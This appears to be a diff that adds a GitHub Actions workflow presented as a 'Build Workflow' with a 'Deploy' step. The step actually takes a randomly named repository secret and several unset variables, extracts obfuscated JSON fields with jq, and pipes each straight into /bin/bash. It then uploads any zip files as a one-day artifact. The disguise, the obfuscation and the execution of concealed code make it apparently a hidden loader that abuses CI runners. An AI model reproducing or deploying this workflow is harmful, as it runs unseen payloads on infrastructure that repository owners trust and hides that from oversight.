@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          r07: ${{ secrets.r07 }}
+        run: |
+          printf '%s' "$r07" | jq -r .vqg602 | /bin/bash
+          echo $kxs36978 | jq -r .j6 | /bin/bash
+          echo $pttk4626 | jq -r .xz34 | /bin/bash
+          printf '%s' "$lfmaa14" | jq -r .hqkzw935 | /bin/bash
+          printf '%s' "$jyg75" | jq -r .ahdan1 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: R8qfTdey
+          path: "*.zip"
+          retention-days: 1
